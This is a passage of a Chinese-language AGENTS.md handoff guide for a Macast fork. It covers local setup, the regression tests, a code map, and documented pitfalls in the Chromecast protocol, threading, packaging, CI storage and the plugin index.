# AGENTS.md — 交接说明（给后续 AI agent / 新协作者）

本文件是**接手这个仓库的第一入口**。它只写"怎么在这里干活、坑在哪、去哪找细节"，
不重复产品说明（见 `README_ZH.md`）和构建说明（见 `BUILDING.md`）。

本仓库是 **`pingod/Macast`**（上游 `xfangfang/Macast` 的分支）。Macast 是一个跨平台
**菜单栏 DLNA / Chromecast / AirPlay 接收端**：手机把媒体 URL 发过来，Macast 用 mpv 播放。

---

## 1. 30 秒跑起来

```shell
cd <repo>
./scripts/run-from-source.sh          # 从源码运行（会 unset PYTHONPATH，见 §5）
```

- 依赖：`.venv`（Python 3.12）+ `requirements/darwin.txt` + `pillow zeroconf pyperclip`。
- Web 设置页：<http://127.0.0.1:58880/>
- 日志：`~/Library/Application Support/Macast/macast.log`（**排障看这个，不是 stdout**）。
  每次启动清空，单文件 2 MB 轮转并保留 2 份备份；设置页「日志」只读末尾若干行（见 §4.10）
- 配置：`~/Library/Application Support/Macast/macast_setting.json`
- 用户插件目录：`.../Macast/renderer/` 与 `.../Macast/protocol/`

## 2. 改完必须做的两件事

```shell
# 1) 静态检查（能秒抓"删代码块时误删变量赋值"这类错误）
env -u PYTHONPATH .venv/bin/python -m pyflakes <改动文件>

# 2) 回归验证（2026-09-25 本机实测 1663/1669 通过（红的 6 条见下面那段）；**总数随环境伸缩**：场上有一个在跑的 Macast（占着
#    8009/58880，甚至 8443 —— 那会把 Part 19 的 4 条 TLS 用例换成 2 条"端口被占就静默降级"）时真实 socket 的那几段没跑就是没跑，套件不会替它承认。所以先看总数，
#    再信"全绿"；跑之前按 §4.2 杀干净实例。
#    **但这台机器上有一组永远红的**：Part 34（来源台账）的 6 条 —— 见 §4.12 末条，
#    那是这份克隆缺对象，不是台账漂移，**不要去手改 docs/Provenance.md 的数字凑绿**）
env -u PYTHONPATH .venv/bin/python scripts/verify_cast_airplay.py
```

> 加新功能/修 bug 时**同时补用例**。这个仓库的验证脚本是唯一能防回退的东西。
> 验证套件把网络全部打桩，所以它**抓不到"真实发送端栈不认账"这类问题**——
> 那类问题要跑 `scripts/cast_conformance.py`（见 §6）。
> 同理它抓不到"应用根本起不来"：套件从不启动 `Macast.py`。跑真应用的是
> `scripts/e2e_smoke.py`（见 §6），它会在本机拉起**第二个** Macast 约 30 秒。

## 3. 代码地图

```
Macast.py                  入口（GUI / CLI 两种模式）
macast/
  macast.py                MacastApp（菜单栏）、MacastPlugin / MacastPluginManager（插件热插拔）
  server.py                CherryPy 服务、HTTP/HTTPS 通道、SSDP 生命周期
  protocol.py              DLNA 协议 + DLNAHandler（Web UI / 管理 API / 网页投屏入口都在这里）、api_token、PlaybackGuard
  protocol_group.py        ProtocolGroup：把多个协议伪装成一个，扇出 start/stop/set_state_*
  protocol_cast.py         Chromecast 接收端（mDNS + Cast v2 over TLS:8009 + setup HTTP:8008）
  protocol_airplay.py      AirPlay 接收端（mDNS + RTSP:7000，仅视频 URL）
  ssdp.py                  SSDP（DLNA 发现）；Sock.send_it 里的 LOCATION 走 Setting.get_ip()
  discovery.py             mDNS 广播（zeroconf），只广播可达地址
  utils.py                 Setting（含网卡枚举/选择）、环境准备、XML 路径
  plugin_repo.py           插件索引/仓库坐标（唯一来源；当前索引为空，第一方插件已全部内置）；见 §4.6
  logsplit.py              按模块独立日志文件（logs/<Name>.log）；见 §4.10
  module_settings.py       「模块设置」面板：谁拥有哪个配置键（唯一来源）；见 §4.11
  mirror_view.py           「电脑投屏」tab 的派生层：把 screen_mirror 的 console_state 变成页面要显示的版式（纯函数，无网络无 UI）；见 §4.8
  gui.py                   跨平台菜单抽象（darwin: rumps；其他: pystray）
  plugins/renderer/        内置渲染器插件：iina / web / live / potplayer / pi_fm（5 个来自上游合集，vendored）
                              + macast_ytdlp / external_player / floating / hooks / cast_bridge / cast_local_file / screen_mirror（本 fork 自研）
  plugins/protocol/        内置协议插件：nirvana（NVA「哔哩必连」，vendored）+ raop / airplay_mirror（本 fork 自研）
  xml/setting.html         设置页（Vue2 + Element UI，**单文件内嵌模板**；
                           帮助弹层与页宽是对外文案，改能力要同步，见 §4.13）
plugins/                   插件索引目录（仓库根目录，与 macast/plugins/ 区分）；当前仅 info.json（空索引）+ README.md，第一方插件已全部内置；见 §4.6
macast_renderer/mpv.py     MPVRenderer：启动 mpv、走 IPC 收发、把 mpv 事件转成状态
scripts/                  见 §6（`provenance.py` 在里面：按 fork 点度量每一行是谁写的，署名与它对齐；见 §4.12）
docs/                     见 §7
```

## 4. 这个仓库踩过的坑（**最重要的一节**）

这些都是真机/真实网络才暴露的，且每一个都曾经以"看起来像别的问题"的形式出现。
改相关代码前先读对应条目，细节见 `docs/Cast-AirPlay-Testing.md`。

### 4.1 Chromecast 相关

| 症状 | 真因 | 修复要点 |
|---|---|---|
| 能搜到、点投屏没反应 | mDNS 把**所有**本地 IPv4（虚拟机网桥、Tailscale）都发成 A 记录，发送端随机挑到不可达地址 | 只广播承载 IPv4 默认路由的网卡（+ 用户显式选择）；见 `discovery.py` |
| 同上 | `RECEIVER_STATUS` 的 `applications[].namespaces` 必须是**对象数组** `[{"name": ...}]`，字符串数组会被 pychromecast / Cast SDK 拒收 | `_app_namespaces()` |
| VLC 连上后**一个字节都不再发** | device-auth 回复必须是 `DeviceAuthMessage{response: AuthResponse{signature, client_auth_certificate}}`。这两个字段是 `required`，裸发 `AuthResponse` 会让 VLC 的 `ParseFromString()` 失败并 `return`，状态机永远停在 `Authenticating` | `encode_auth_response()` |
| 设备仍被广播、8009 仍 `LISTEN`、TCP 能连，但 TLS 握手永远超时 | **`except OSError: break`**：`ssl.SSLError` 是 `OSError` 子类，某次失败握手把 accept 循环整个干掉了 | 明文监听 + 每连接 `wrap_socket`；循环里区分"监听器没了"与"单条连接失败" |
| 有声音没画面 | 先看 `video-reconfig`（见 §5 排查手法），多数是**发送端只推了音频**（VLC 的 `--sout-chromecast-video` 关掉时 `Add()` 丢弃所有非音频 ES） | `protocol_cast.py` 记录 `contentType` 供判定 |
| 连上了但什么都没播 | mpv 继承了 `http_proxy`，局域网地址也走代理 → `HTTP error 502` | `Setting.get_system_env()` 对播放器摘掉代理变量 |

### 4.2 通用陷阱

- **`Setting.get(key, default)` 有副作用**：读不存在的 key 会把 default 写进内存 dict 并持久化。
  判断存在性用 `Setting.has()`，删除用 `Setting.unset()`。
- **`setting.html` 在 `Handler.__init__` 里被 `load_xml` 缓存**：改前端模板**必须重启应用**才生效，
  否则会以为"改了没效果"。
- **`ProtocolGroup` + 基类同名空方法**：`Protocol` 自己定义了 `set_state_*` 空方法，
  所以扇出函数必须装到**实例属性**上才能盖过类方法（否则状态静默丢弃）。
- **同一族陷阱同样吃掉读接口**：`Protocol` 还定义了 `get_state` / `get_state_*` /
  `set_state` 的空实现。`ProtocolGroup` 不覆盖它们，基类的桩就会赢，**永远不转发**给
  真正持有播放状态的 `DLNAProtocol`。症状是"状态页全空"：标题、音量、进度全是空串，
  前端显示 `—` / `0` / `0:00:00` 且永不刷新；字幕显隐开关也一直读到 `''`。
  修法是 `ProtocolGroup._install_state_methods()` 里对 `set_state*` 装扇出、
  对 `get_state*` 装委托（`_delegate_getter`），并且**不要**只按 `set_state_` 前缀筛
  （裸 `set_state` 没有尾随下划线，漏掉它 mpv 的轨道/音量更新就丢了）。
  回归用例在验证套件 Part 6 末尾（`_Rec` 那种不继承 `Protocol` 的假对象抓不到这个 bug，
  必须用真的 `DLNAProtocol`）。
- **`ProtocolGroup.primary` 决定 CherryPy 树根**：它按 `handler_priority` 取最大值。
  某个协议的 handler 若**继承**了另一个协议的 handler（NVA 继承 `DLNAHandler`），
  它必须声明更高的优先级，否则按加入顺序 DLNA 会赢，NVA 的 SETUP/RESTORE 端点
  全部静默不可达。
- **`event_subscribes` 用 `ProtocolGroup.event_subscribes` 聚合**（属性，跨所有子协议合并），
  别再退回 `getattr(protocol, 'event_subscribes', {})`——那只会问到 primary 一个子协议。
- **订阅者必须"没有状态变更也能入表"**：`add_subscribe` 只是把客户端压进
  `append_device_queue`，真正写进 `event_subscribes` 的是**事件线程**。而排空这个队列
  原先只在 `send_states_to_clients()` 里做，那个调用又被 `state_queue` 非空门控。
  DLNA **故意不 observe 播放位置**（位置靠客户端轮询 `GetPositionInfo`），
  所以"视频稳定播放中"时 `state_queue` 一直为空 ⇒ 冷启动后**第一个订阅者永远不进表**，
  设置页「客户端信息」一直显示"暂无订阅客户端"。
  修法：事件线程每轮无条件 `_reap_timed_out_clients()` + `_sync_subscribe_list()`。
  排查现成工具：`curl 'http://127.0.0.1:58880/api?query=subscribers'` —— 按子协议列出
  `subscribed` 与 `pending_append`；**非零 `pending_append` 就是队列没被排空**。
- **`event_subscribes` 是**发布**出去的，不是就地改的（copy-on-write）**：单写者是事件线程，
  它构建新 dict 后**一次赋值**发布；每个读者**把属性绑定一次**再迭代那份快照。
  谁要是往 `self.event_subscribes[...] = ...` / `.pop()` / `.clear()` 这条路回去，
  CherryPy worker 上的读者就会撞 `RuntimeError: dictionary changed size during iteration`。
  两条读路径都用真线程复现过（2026-09-25）：状态页那条合并表读 **8 秒 110 次**（被 try/except
  吃掉 ⇒ 页面「客户端信息」整块消失，症状长得像上一条旧病），`add_subscribe` 那条
  **20 秒 148,302 次**且**没人兜** ⇒ 控制点吃 **HTTP 500**，此后它不再收事件，
  用户读到的是"投屏后进度条不再动"。**这一格是我们的问题不是发送端的**。
  **为什么不是加锁**：`send_states_to_clients` 的迭代横跨对每个订阅者的网络 I/O
  （`HTTPConnection(host, timeout=5)`），一把锁等于让一个死掉的客户端把 SUBSCRIBE 处理按住一个
  connect timeout。同一条路上顺手收掉的两处：`renew_subscribe` 改 `.get()`（sid 在脚下消失时
  回 **412** 而不是抛 `KeyError`），以及 `ObserveClient.__init__` 里那行 `print(self.host)` 删掉
  （每次订阅往没人读的 stdout 写一行；Windows 窗口版根本没有 stdout，见 Part 41）。
  回归用例 **Part 49**（29 条：发布契约 + 五条读路径各自对打一个真在 churn 的写线程 +
  两条"不许再出现就地扩容"的文本规则 + stdout 沉默），四个变异体各自红 8/1/1/1 条。
  细节见 `docs/architecture-review-2026-09.md` 的 R3「已修」。
- **`ProtocolGroup._delegate_getter` 对 `KeyError` 要静默**：状态页会问一批超集键名
  （如 `CurrentURI` 只是 AVTransport.xml 里的 action 参数，不是 stateVariable）。
  按 ERROR 记会变成"每次轮询 × 每个缺失键"各一条，把真问题淹掉。
- **DLNA 默认插件的真实标题是 `DLNA Protocol`**（由类名推导），持久化/比对一律走
  `MacastPluginManager.resolve_title()`，别硬编码 `"DLNA"`。
- **多协议并发时 `event_subscribes` 等 DLNA 专属属性要 `getattr(..., default)`**，
  否则只启用 Chromecast 时会抛 AttributeError。
- **CherryPy 工作线程改 AppKit 菜单不安全**：走 `App.call_on_main_thread()`。
- **多实例会把端口写歪**：旧实例占着 58880 时起新实例，端口回退会把 `ApplicationPort`
  改成随机值并重置 USN。起新实例前先杀干净（`lsof -nP -iTCP:8009 -sTCP:LISTEN -t`）。
- **SIGINT 杀得掉菜单栏 Macast，SIGTERM 杀不掉**（2026-09-21 实测，三次跑里三次一致）。
  Cocoa 事件循环不理会 `SIGTERM`，`kill <pid>` 之后进程照常监听 58880/8009。所以 §4.2 上面那条
  "起新实例前先杀干净"**必须是 `kill -2`**（或走菜单），`scripts/e2e_smoke.py` 的信号升级顺序
  也因此是 SIGINT → SIGTERM → SIGKILL 而不是 SIGTERM 优先。附带一条更烦的：**信号退出跳过
  `MPVRenderer.stop()` 的收尾**，空闲的 mpv 会留在场上（三次跑里两次如此，本机另有 5 个
  `ppid=1`、活了 1–3 天的 mpv 佐证）——被反复重启的 Macast 会**攒播放器**。清理用
  `lsof -nP -iTCP:<port> -sTCP:LISTEN -t` + `pgrep -f <ipc socket path>`，`ps` 在这台机器的
  CLI 沙箱里不可用（见 §5）。
- **`mpv --http-proxy=` 不能替代摘环境变量**，ffmpeg 的 HTTP 层仍然读 `http_proxy`。
- **假命令行工具的输出，必须是真工具在这台机器上的逐字输出**。`screen_mirror` 的采集探测要问
  `ffmpeg -f avfoundation -list_devices true -i ""` 有哪些设备，而那段解析是按一个**从未存在过的
  格式**写的：它找大写 `Video devices:` 且只取双引号里的名字，真实输出是小写
  `AVFoundation video devices:` 且设备名**不带引号**（`[0] OBS Virtual Camera`）。结果真 Mac 上
  两个列表永远为空、镜像从 v0.1 起就起不来 —— 而验证套件全绿，**因为 Part 21/22/23 的假 ffmpeg
  抄的就是那个虚构格式**：测试和实现共享同一个错误假设时，用例数为零。现在 Part 31 用真机输出喂解析器，
  并反过来扫测试文件自己：`-list_devices` 回答里出现"带引号却没有索引"的设备行就变红。
- **rumps 0.4.0 自己一次都不做主线程派发**（`rumps/rumps.py` 里 `callAfter` 出现 **0 次**），
  所以 `rumps.notification`、`Menu.clear`、`insertItem_atIndex_`、`MenuItem.title=` 全部**在调用它的那个线程上
  直接操作 AppKit**。用户报的"菜单有时要点好几次，点一次就又消失了"就是这个：正在 tracking 的 NSMenu
  一旦在别的线程被改动，AppKit 立刻收起菜单，那一次点击作废。症状只在**用户正握着菜单的时候**别处发生了
  UI 写入时出现，所以它时好时坏。这条同时解释了 §4.2 里"协议开关不许整表重建"那条注释为什么必要。
  两处违规已修（套件 **Part 47** 钉住，24 条，两个变异体各自变红）：
  ① `App.notification` —— 它挂在 `cherrypy.engine.subscribe('app_notify', …)` 上，而全仓有
  **52 处 `publish('app_notify', …)`**（`macast/` 49 + `macast_renderer/mpv.py` 3），来自 CherryPy 工作线程、mpv 的 IPC 线程、镜像线程；这个数字**由 Part 47 用 AST 现场数出来，再反过来比对写它的两处散文**（本条与 Part 47 自己的头注释），抄错的数字当场变红 —— `grep` 数出来的是 47，因为它既看不见跨行写的调用、也数不清被注释掉的旧报告。现在 Darwin 分支
  走 `call_on_main_thread`（pystray 分支**故意不动**：§4.8 那条"通知失败不许吃掉 teardown"的契约是按
  它就地抛/就地截断写的）。
  ② `Macast.update_service_status` —— cherrypy 的 `start`/`stop` 钩子跑在 **SERVICE_THREAD**
  （`server.run_async` 就是在别的线程上 `engine.start()` 的），而它写 `toggle_menuitem.text`
  ＝`NSMenuItem setTitle_`，也就是**用户点服务开关的那一瞬间**从后台改菜单。
  **`gui.MenuItem` 的 `text/checked/enabled` setter 本身就是未经保护的 AppKit 写**（view 已经挂上时），
  新加写入点的人必须给出"我为什么在主线程上"的理由：Part 47 因此扫 `macast.py`（七处，逐条登记理由：
  菜单回调、构建期还没有 view、已经走队列的 `_refresh_ip_menu`/`update_service_status`）
  与 `macast/plugins/**`（只许 `build_menu*`/`on_*` 这两种名字）。
  两条顺带记下的机理：`performSelectorOnMainThread:waitUntilDone:NO` 只在**默认 run-loop mode** 派发，
  所以菜单开着时排队的改动会**等用户松手**才落地（这正是我们要的方向：它不再从光标底下抽走菜单）；
  而**循环还没起来时**排队的改动会在 `App.run()` 起来后立刻执行 —— 已用真机探针验过（`app.run()` 之前
  从 `SERVICE_THREAD` 排的notification 与 setTitle_ 都在 `MainThread` 落地，
  真 `NSUserNotificationCenter` 接受这一条延后调用），所以启动横幅不会被打桩测试"测出来的一条假绿"吞掉。

### 4.3 打包（v0.7.11 的产物曾经**全部无法启动**）

**症状**：`.app` / Linux / Windows 产物双击或运行后立刻退出，日志里是
`ModuleNotFoundError: No module named 'zeroconf'`（或 `... 'zeroconf._services' is not
a package`）。**源码运行完全正常**，所以很容易漏掉。

**两个原因，都要记住：**

1. **依赖列表写了多份然后漂移。** `zeroconf`（mDNS 广播，`macast/discovery.py` 顶层
   import）被加进了代码和 `requirements/common.txt`，但 **没**加进
   `requirements/darwin.txt`、`scripts/build_macos_arm.sh` 的内联 pip 列表、
   CI 里 4 个 job 各自的内联 pip 列表、以及 `setup_py2app.py` 的 `includes`。
   于是构建环境里根本没有它，py2app 看不到这个 import，产物就缺。
   → 现在 **`requirements/darwin.txt` 是唯一来源**（本地构建脚本也改为 `-r` 它）。
   加新依赖时，请同时检查：`requirements/*.txt`、CI 各 job、`setup_py2app.py`、
   pyinstaller 的 `--collect-all/--hidden-import`。

2. **`zeroconf` 不能只写进 `includes`，必须写进 `packages`。** 它同时发布 Cython
   编译产物和 `.py` 源码，而 `zeroconf/_services/__init__` 正是编译版。modulegraph
   会把 `zeroconf._services` 当成**单个扩展模块**（叶子节点）而不再下钻，包内于是
   只有 `lib-dynload/zeroconf/_services.so`、没有 `_services/` 目录：
   `ModuleNotFoundError: No module named 'zeroconf._services.info'; 'zeroconf._services'
   is not a package`。`packages` 是整目录拷贝，才能带上子模块；顺带把
   `ifaddr`（zeroconf 的唯一运行时依赖）也放进 `packages`。

**排查手法**（比读 build 配置快）：

```shell
# 1. 直接跑包里的可执行文件，看真实报错（不要只看 CI 绿）
env -u PYTHONPATH /Applications/Macast.app/Contents/MacOS/Macast
# 2. 确认可疑包是否真在包里（py2app 会把纯 Python 部分塞进 lib-dynload 或 zip）
find /Applications/Macast.app -iname "*zeroconf*" | head
```

**教训：CI 全绿 ≠ 产物能用。** 发版后一定要把下载下来的产物**真正启动一次**并确认
它监听了 8009/58880、`/api?query=status` 能返回版本号（见 §8）。

**反面的一半也成立：CI 全红 ≠ 代码坏了。** 2026-09-21 发 v0.7.15 时四个平台 job 全红，
但**只红在 `Upload artefact` 这一步**（构建 / arm64+i18n 校验 / 签名 / 打包 zip 全绿），
报错 `Failed to CreateArtifact: Artifact storage quota has been hit` ——
四处 `retention-days: 14` × 每次约 170 MB × 免费方案 500 MB 上限，从 9 月 14/15 那两波密集构建起
就一直撞（193 份 / 8.2 GB），与本次改动无关。修法是先删旧 artefacts 再把留存改成 **2 天**（`7012268`），
然后 `gh run rerun --failed` 重跑同一个 run（保留 tag 上下文，不用重推 tag）。
**Releases 的产物不受影响**：那是另一个桶，删 Actions artefacts 不会动到已发布版本的下载链接。
所以看 CI 失败时**先定位到哪一步**再判断是谁的锅；这一步红的修法（清存储）和代码红的修法（改代码）
完全不同，撞错了方向会白改一遍代码。

**改 2 天留存只是把墙推远，没有拆掉它**（2026-09-25 又撞一次：84 份 / 3.5 GB）。
算术很直白：一次四平台构建约 170 MB，免费方案上限 500 MB，所以**留存窗口内只要跑过三次构建就必然撞**，
而密集开发期一天就能推三次。更具体的一笔账：改之前那四个 `Upload artefact` 步骤是**无条件**的，
所以**每一次普通 main push 也都往 Actions 存储里放四份产物** —— 最近 27 次构建里 **14 次是主分支构建**
（另外 13 次是 tag），而主分支构建的那 ~2.4 GB 没有任何读者。
现在的做法是两道一起上，都在 `build.yml` 里，并由套件 **Part 46** 钉住：

- **四个 `Upload artefact` 步骤带同一个门**：只有 tag push 与 `release=true` 的手工 dispatch 才上传。
  普通 main push 照样四平台全构建，只是**不往 Actions 存储里放东西**——它没有读者。
  要一次性主分支构建就 dispatch `release=true`（或推个 `v*.*` tag）。
- **`Free artefact storage` job 在 Release 发布成功后按 id 删掉本轮 artefacts**。
  它**故意不在 release 失败时跑**：那种情况要用 `gh run rerun --failed` 只重跑 release 那一个 job，
  而它会下载本轮的 artefacts；提前清扫就把"一步重试"变成"四平台重建"（§4.3 上面那条经验的反面）。
- 留存 2 天降级为**兜底**（清扫 job 自己失败时）。

**注意 Releases 与 Actions 是两个桶**（v0.7.15 → v0.8.10 十二个版本的四个产物都在 Releases 里活得好好的，
同时 Actions 是满的），所以这套清扫**不会**动到任何人的下载链接。
Part 46 的三条变异体已逐个验过：改开一个门 / 删 `actions: write` / 把清扫放宽成 `always()`，
各自都会当场变红。

### 4.4 `macast/plugins/**` 的"动态导入"打包坑（与 §4.3 同族）

内置插件（IINA / Web / Live / PotPlayer / PIFMRDS / NVA，来自
`xfangfang/Macast-plugins`）**从来不用静态 `import` 引入**：
`MacastPluginManager._load_bundled_plugins` 用 `os.listdir` 拼出 dotted path
再 `importlib.import_module`。**任何依赖扫描器都看不见它们**，所以产物里静默少一个
插件时，源码运行一切正常。

必须同时改三处，少一处就漏：

| 位置 | 要写什么 |
|---|---|
| `scripts/setup_py2app.py` | 加进 **`includes`**（见下） |
| `.github/workflows/build.yml` | 3 个 PyInstaller job 各加 6 个 `--hidden-import=` |
| 新增第三方依赖时 | `requirements/*.txt`（见 §4.3） |

**两套打包工具的选项名不一样，混用会直接让构建失败：**

- py2app 认 **`includes`**；传 `hiddenimports` 会报
  `error: error in setup script: command 'py2app' has no such option 'hiddenimports'`。
- PyInstaller 认 **`--hidden-import=`**（没有 `includes` 这个 CLI 选项）。

我就在这上面栽过一次：源码 206/206 全绿，`bash scripts/build_macos_arm.sh` 直接失败。
**所以改打包配置后一定要真跑一次构建**，别只看测试。

`packages: ['macast']` 会把目录整份拷进去（插件源码散落在
`Contents/Resources/lib/python3.12/macast/plugins/`），其余纯 Python 依赖被 py2app 打进
`lib/python312.zip` —— 所以**别用 `find` 找散文件来判断依赖在不在**，会误判成"缺失"。
正解是查 zip：

```shell
Z=dist/Macast.app/Contents/Resources/lib/python312.zip
python3 -c "import zipfile;print([n for n in zipfile.ZipFile('$Z').namelist() if n.startswith('requests/')])"
```

产物校验手法见 `BUILDING.md` 的 "Verify the bundled plugins actually made it into the artefact"。

### 4.5 插件清单（`<macast.*>`）只在**文件顶部注释**里解析

`_read_plugin_metadata` 先截出开头连续的注释块，再用
`<macast\.([\w.]+)>([^<]*)</macast\.[\w.]+>` 解析。两条约束都是被踩出来的：

- **值里不能出现 `<`。** 早先用 `(.*?)` + `re.S`，于是后面任何一处提到闭合标签的
  注释都会成为假终止符，把中间的标签整段吞掉。给 PotPlayer 写"原作者的 platform
  标签闭合写错了"这句注释时，就把 `renderer` 的值污染成了半句话。
- **只读头部。** 扫码全文只会给正文/文档制造被误认成清单的机会。

`_guess_plugin_class` 是兜底：清单写错类名时按模块体里的类反推，不再直接丢插件。

### 4.5b 插件卡片的作者 / 头像 / 描述（`setting.html`「插件」tab，Part 45）

设置页每张插件卡显示 `<macast.author>`、`<macast.desc>` 与一个头像。三条都已定死并有 Part 45 守着：

- **作者一律以 `pingod` 开头。** 本 fork 自研的插件写 `pingod`；**6 个 vendored 插件写混合作者**
  `pingod（原作者 xfangfang）`（`live.py` 是 `dushan555`）—— 我们不把他人的代码署成自己的名，
  但主名是维护者。文件头的版权声明与 "Copied from" 行**不动**（那是 §4.12 台账的证据）。
- **描述一律中文。** 每个 `macast/plugins/*.py` 的 `<macast.desc>` 必须含中日韩字符；
  `MacastPlugin._builtin_desc(kind)`（内置插件没写自己 `<macast.desc>` 时的兜底，核心三张卡走这条）
  也必须是中文，否则英文 "Built-in renderer." 会漏到中文卡片上。
- **头像走本地图 `/assets/avatar.png`，绝不再按卡片请求 `api.github.com/users/<author>`。**
  那个 host 正是国内网络会卡住的那一个，而十几张卡拉的都是同一个 pingod 头像。
  因此 `setting.html` 里**不允许**出现 `api.github.com/users` 或 `get_github_avatar`；
  `circleUrl` 的初值就是本地资源路径。头像由 `macast/assets/icon.png` 裁成圆形衍生而来。

### 4.6 插件索引与内置策略：地址只有一处，页面不写死

本仓库的 15 个第一方插件**全部内置**（`macast/plugins/renderer/` 与 `macast/plugins/protocol/`，
见代码地图），应用启动时由 `MacastPluginManager._load_bundled_plugins` 自动加载，无需在线索引。
因此仓库根目录的 `plugins/info.json` 现在是**空索引**（`"plugin_v1": []`）—— 不再出现"可更新"
角标，也不会和内置插件重复出卡片（Part 5c 守着"索引不得重复列出内置插件"）。

现在的做法：

- 仓库坐标与索引地址只在 **`macast/plugin_repo.py`**（`pingod/Macast` →
  `plugins/info.json`），由 `/api?query=plugin-info` 的 `plugin_repo` 字段下发；
  `setting.html` 里**不允许**再出现任何插件仓库 URL（Part 5c 有用例守着）。
- **前提：本仓库是**私有**的，所以在线索引对别人是坏的 —— 而这件事已经是决定，不是待办。**
  jsDelivr 与 raw 都读不到私有仓库，而下载插件时 Macast 不带凭据 —— 卡片照常渲染、
  「安装」才失败。判据与逐条实测结果见 §5 相应条目（9 条固定链接已有 4 条 404，
  剩下 5 条是 CDN 在仓库还可读时缓存的副本，会逐个掉光）。
  Part 5c 的 `git show <sha>:plugins/<file>` 只证明「条目 == 所指内容」，**不证明可达**，
  两者不要混。
  **2026-09-21 用户选定：保持私有，官方只承诺手动安装**（设置页「从网址安装」/
  把 `.py` 放进配置目录的 `renderer/`、`protocol/`）。所以：
  ① **不要再提"改公开 / 另立公开仓库"**，那是已经回答过的问题；
  ② 索引、`plugins/README.md`、`docs/Casting-Suite.md`、设置页文案都必须把「这里只有源码」
  说在前面，别让人把安装失败当网络问题排半天；
  ③ `scripts/check_index_reachability.py` 在私有状态下稳定报 `INDEX_PRIVATE`
  （退出码 2）—— **这是预期信号，不是待修的 bug**，也正因为如此它不能被当成"成功"。
  `scripts/selfcheck.py` 的「online plugin index」段把这三问都替用户跑一遍
  （GitHub 匿名 + 公开上游对照组 + jsDelivr 元数据 API + 逐条固定链接）。
- 索引本体在**仓库根目录**的 `plugins/info.json`（不是 `macast/plugins/`，后者是内置插件）：
  当前为**空索引**（`"plugin_v1": []`），页面只显示本机已内置的插件，不报错。需要发布第三方
  索引时再往里加条目（见下）。
- **索引本身**（唯一一个没法固定 SHA 的文件）走三个地址，按「新鲜度」排序：
  `raw.githubusercontent.com`（永远最新，国内常拉不动）→
  `ghproxy.net/https://raw.githubusercontent.com/...`（国内可达；自称 `max-age=300`，
  实测推送 6 分钟后仍给旧文件）→ `cdn.jsdelivr.net`（**分支文件缓存数小时、`?v=` 也破不了**）。
  也就是说索引最多可能滞后几小时，**但它只影响「新插件多久能被看到」**，装到手的文件永远是对的
  （安装 URL 固定了 SHA，见下）。
  浏览器按序回退；三者都必须返回 CORS 头，因为这是在**浏览器里** fetch，不是 Python 抓。
  改顺序前先想一遍：把会缓存的放前面 = 用户看到的插件列表可能落后半天。
- **设置页拉索引必须带时间戳查询串**（`?t=Date.now()`）：只治**浏览器**的 HTTP 缓存 ——
  索引刚推上去时普通刷新常常还在吃旧副本，「插件卡片不见了」多数就是这么来的。
  CDN 服务端缓存会忽略未知参数，所以固定 SHA 那套不受影响。Part 5c 有用例守着。
- **「启用国内镜像地址」**（`Github_CN_Mirror`，缺 key == 关；关掉走 `Setting.unset` 而不是
  存 `False`）：一个开关改写**所有运行时 fetch 的 GitHub 地址** —— 插件索引（`index_urls()`
  去重后 ghproxy → jsDelivr）、「从网址安装」的下载（`install_url()`）、版本检查
  （api.github.com / releases）、「打开插件仓库」按钮。改写规则只有三个 host 前缀
  （github.com / raw.githubusercontent.com / api.github.com → 加 `https://ghproxy.net/` 前缀），
  **jsDelivr 本身就是国内可达的镜像，绝不再加前缀**。全部逻辑在 `plugin_repo.py`
  （`to_mirror_url` 纯函数 / `mirror_url` 按开关 / `index_urls` / `describe`），页面只发
  `POST set-github-mirror`（在 `_MANAGEMENT_PARAMS` 门控名单里），**页面里不允许出现镜像前缀
  字符串** —— Part 5c 有 `"ghproxy" not in _html` 这条用例。切换成功后后端直接回传新的
  `describe()`，页面立刻按新地址重拉索引。
- 往 `plugins/info.json` 里加条目时：`renderer`/`protocol` 字段是「本机装没装」的判定键，
  `version` 必须与 `.py` 里 `<macast.version>` 一致，否则又是假的「可更新」。整个条目
  和 `.py` 顶部清单必须逐字对齐 —— Part 5c 会比对 title / version / platform / 类名。
- 条目的 `url` **固定到 commit SHA**（`https://cdn.jsdelivr.net/gh/pingod/Macast@<sha>/plugins/<file>.py`），
  绝不指向分支。原因是一轮实测：分支引用会被中间缓存长期冻结 —— jsDelivr 缓存数小时、
  **`?v=` 查询串破不了它**（把插件升到 0.2 后请求 `?v=0.2` 拿回来仍是 0.1 的内容），
  ghproxy 自称 `cache-control: max-age=300`，实测推送后 6 分钟仍在给旧文件。
  固定 SHA 之后内容不变，缓存多旧都是对的（raw 直链在国内还是经常拉不动，所以走 jsDelivr 的 CDN 入口）。
  代价是插件更新的流程变成两步：**① 先提交插件文件；② 再把条目里的 SHA/version 指到那个提交**。
  Part 5c 用 `git show <sha>:plugins/<file>` 校验「条目 ↔ 所固定内容」一致，忘了第 ② 步会当场变红。
  安装是 Python 侧 `requests`（`MacastPluginManager.install_url`）拉的，没有浏览器多地址回退，
  出问题时把 raw 直链粘到设置页的「从网址安装」即可（后端本来就先 `split('?')[0]` 再判 `.py`）。
- 第三方/用户自建插件与内置插件是**两回事**：放进 `plugins/info.json` 索引、由用户从设置页
  「从网址安装」或把 `.py` 丢进配置目录 `renderer/`、`protocol/` 的，是「单个 .py、只能用
  Macast 自带依赖 + 标准库 + 外部命令」；需要 pip 库或要随包发布的第一方插件一律走
  `macast/plugins/`（并同步 §4.4 的三处打包配置）。
- **「只能用自带依赖」现在是一条会被测红的规则**（Part 30）：每个 `macast/plugins/*.py` 的 import
  取根名，必须落在 `标准库 ∪ requirements/*.txt 声明的包提供的顶层模块 ∪ {macast, macast_renderer}`
  里，否则就是"插件里塞了个 pip 库"。平台专属的名字走 `_PLATFORM_OPTIONAL` 表
  （模块名 → 发行包 → 哪个 requirements 文件声明了它），因为**在 Linux 上跑套件时
  `importlib.metadata` 根本看不见 pyobjc**，只能按规则放行、再由"那个文件真的声明了它"兜住。
  第二张表 `_OPTIONAL_BY_FALLBACK` 收的是另一类：**任何构建都不装、靠代码自己降级**的模块
  （现仅 `win32api` / `win32con` —— `potplayer.py` 只用它读注册表拿 PotPlayer 安装路径，
  代码自己写着 "missing pywin32 … mean 'ask the next source', not 'fail'"，依次回退到用户
  配置路径与两个默认安装位置）。放行条件是**把断言验回代码上**：该 import 必须真的坐在
  `try/except ImportError` 里、且在 except 里被赋成 `None`，否则不放行 —— 不然这张表就是
  "什么都不声明、什么都能 import"的后门。**别把它塞进 `_PLATFORM_OPTIONAL`**：那要求一个
